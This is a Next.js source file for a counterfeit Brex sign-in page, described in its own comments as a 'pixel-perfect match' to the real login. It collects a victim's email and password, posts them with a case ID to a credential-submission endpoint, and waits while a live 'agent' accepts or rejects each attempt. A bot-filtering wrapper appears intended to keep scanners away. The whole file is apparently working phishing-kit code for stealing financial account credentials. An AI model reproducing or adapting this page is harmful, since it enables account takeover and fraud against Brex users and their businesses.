'use client';

/**
 * Brex Credentials Page
 * 
 * Pixel-perfect match to Brex login design
 * Email + Password fields with split-screen layout
 * Remember me checkbox, social login, forgot links
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [usernameError, setUsernameError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  // Track whether we're on email step or password step
  const [currentStep, setCurrentStep] = useState(1);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
      setCurrentStep(1);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');
      setUsernameError(false);
      setPasswordError(false);

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (currentStep === 1) {
        // Step 1: Validate email
        if (!username.trim()) {
          setUsernameError(true);
          setFieldError('This field cannot be left blank');
          return;
        }
        // Move to password step
        setCurrentStep(2);
        return;
      }

      // Step 2: Validate password and submit
      if (!password) {
        setPasswordError(true);
        setFieldError('This field cannot be left blank');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId, currentStep]
  );

  const handleBack = () => {
    setPasswordError(false);
    setFieldError('');
    setPassword('');
    setCurrentStep(1);
  };

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column: Login */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">

              {/* Global Error */}
              {(fieldError || (error && !fieldError)) && (
                <div className="global-error">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" clipRule="evenodd"
                      d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                      fill="#b92d26" />
                  </svg>
                  <span>{fieldError || error}</span>
                </div>
              )}

              <h1>Sign in to your Brex account</h1>

              <form className="auth-form" onSubmit={handleSubmit} noValidate>

                {/* Email Field */}
                <div className="o-form-fieldset">
                  <label htmlFor="username">Email</label>
                  <div className={`input-wrapper${usernameError ? ' error' : ''}`}>
                    <input
                      type="email"
                      id="username"
                      name="username"
                      autoComplete="username"
                      className={currentStep === 2 ? 'input-locked' : ''}
                      value={username}
                      onChange={(e) => {
                        setUsername(e.target.value);
                        setUsernameError(false);
                        if (fieldError) setFieldError('');
                      }}
                      disabled={isWaiting || currentStep === 2}
                    />
                  </div>
                  {usernameError && (
                    <div className="field-error">
                      <svg width="14" height="14" viewBox="0 0 16 16">
                        <path fillRule="evenodd" clipRule="evenodd"
                          d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                          fill="#b92d26" />
                      </svg>
                      <span>This field cannot be left blank</span>
                    </div>
                  )}
                </div>

                {/* Password Field (Step 2) */}
                {currentStep === 2 && (
                  <div className="o-form-fieldset">
                    <label htmlFor="password">Password</label>
                    <div className={`input-wrapper${passwordError ? ' error' : ''}`}>
                      <input
                        type="password"
                        id="password"
                        name="password"
                        autoComplete="current-password"
                        value={password}
                        onChange={(e) => {
                          setPassword(e.target.value);
                          setPasswordError(false);
                          if (fieldError) setFieldError('');
                        }}
                        disabled={isWaiting}
                      />
                    </div>
                    {passwordError && (
                      <div className="field-error">
                        <svg width="14" height="14" viewBox="0 0 16 16">
                          <path fillRule="evenodd" clipRule="evenodd"
                            d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                            fill="#b92d26" />
                        </svg>
                        <span>This field cannot be left blank</span>
                      </div>
                    )}
                  </div>
                )}

                {/* Remember Me + Submit Button */}
                <div className="auth-actions">
                  {currentStep === 1 && (
                    <div className="o-form-input-name-rememberMe">
                      <label className="checkbox-label" htmlFor="remember">
                        <input type="checkbox" id="remember" name="remember" />
                        <span className="custom-checkbox"></span>
                        Remember me
                      </label>
                    </div>
                  )}

                  <button type="submit" className="button-primary" disabled={isWaiting}>
                    {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
                    {isWaiting ? 'Signing in...' : (currentStep === 1 ? 'Next' : 'Sign in')}
                  </button>
                </div>
              </form>

              {/* Email step: Social auth */}
              {currentStep === 1 && (
                <div>
                  <div className="social-auth-divider">
                    <span className="divider-line"></span>
                    <span className="divider-text">or</span>
                    <span className="divider-line"></span>
                  </div>

                  <div className="social-auth-buttons">
                    <button className="social-btn" type="button">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M22.0224 12.2353C22.0224 11.4588 21.9526 10.7059 21.8228 9.97647H12.2275V14.2588H17.721C17.4815 15.6471 16.6631 16.8235 15.4855 17.6118V20.3765H18.7885C20.7246 18.5882 21.8228 15.9059 21.8228 13V12.2353Z" fill="#4285F4" />
                        <path d="M12.2274 22.2353C14.9819 22.2353 17.2972 21.3176 18.9838 19.7412L15.6808 16.9765C14.7626 17.6 13.595 17.9647 12.2274 17.9647C9.5828 17.9647 7.33735 16.1765 6.53896 13.7529H3.13586V16.6118C4.81249 19.9529 8.24555 22.2353 12.2274 22.2353Z" fill="#34A853" />
                        <path d="M6.53888 13.5176C6.3293 12.8941 6.20954 12.2353 6.20954 11.5529C6.20954 10.8706 6.3293 10.2118 6.53888 9.58824V6.72941H3.13579C2.44717 8.09412 2.04797 9.61176 2.04797 11.2C2.04797 12.7882 2.44717 14.3059 3.13579 15.6706L6.53888 13.5176Z" fill="#FBBC05" />
                        <path d="M12.2274 5.38824C13.7244 5.38824 15.0617 5.90588 16.1196 6.91765L19.0636 3.97647C17.2872 2.31765 14.972 1.34118 12.2274 1.34118C8.24555 1.34118 4.81249 3.62353 3.13586 6.96471L6.53896 9.82353C7.33735 7.38824 9.5828 5.38824 12.2274 5.38824Z" fill="#EA4335" />
                      </svg>
                      Sign in with Google
                    </button>

                    <button className="social-btn" type="button">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M11.4 11.4H2.4V2.4H11.4V11.4Z" fill="#F25022" />
                        <path d="M21.6 11.4H12.6V2.4H21.6V11.4Z" fill="#7FBA00" />
                        <path d="M11.4 21.6H2.4V12.6H11.4V21.6Z" fill="#00A4EF" />
                        <path d="M21.6 21.6H12.6V12.6H21.6V21.6Z" fill="#FFB900" />
                      </svg>
                      Sign in with Microsoft
                    </button>
                  </div>
                </div>
              )}

              {/* Password step: Secondary actions */}
              {currentStep === 2 && (
                <div className="secondary-actions">
                  <button className="pill-btn" type="button" onClick={handleBack}>
                    &#8592; Use a different email
                  </button>
                  <button className="pill-btn" type="button">
                    Forgot your password?
                  </button>
                </div>
              )}

            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing (Desktop Only) */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
